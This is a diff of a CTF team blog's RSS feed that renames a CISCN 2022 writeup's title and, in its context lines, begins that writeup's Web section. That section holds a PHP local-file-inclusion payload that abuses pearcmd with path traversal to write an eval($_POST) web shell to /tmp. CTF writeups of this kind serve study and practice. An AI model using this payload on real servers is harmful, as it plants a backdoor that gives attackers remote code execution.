@@ -1615,12 +1615,12 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
         </item>
         <item>
-        <title>CISCN2022 初赛 Writeup by or4nge</title>
+        <title>CISCN2022 华北分赛区 Writeup by or4nge</title>
         <link>https://or4ngesec.github.io/post/ciscn-2022-north-writeup-by-or4nge/</link>
         <pubDate>Tue, 28 Jun 2022 17:17:17 +0800</pubDate>
         
         <guid>https://or4ngesec.github.io/post/ciscn-2022-north-writeup-by-or4nge/</guid>
-        <description>&lt;img src="https://or4ngesec.github.io/post/ciscn-2022-north-writeup-by-or4nge/cover.png" alt="Featured image of post CISCN2022 初赛 Writeup by or4nge" /&gt;&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
+        <description>&lt;img src="https://or4ngesec.github.io/post/ciscn-2022-north-writeup-by-or4nge/cover.png" alt="Featured image of post CISCN2022 华北分赛区 Writeup by or4nge" /&gt;&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
 &lt;h3 id=&#34;include&#34;&gt;include&lt;/h3&gt;
 &lt;p&gt;p牛的PHP裸文件本地包含&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/index.php?+config-create+/&amp;amp;file=../../../../usr/local/lib/php/pearcmd&amp;amp;/&amp;lt;? eval($_POST[1]);?&amp;gt;+/tmp/hello.php
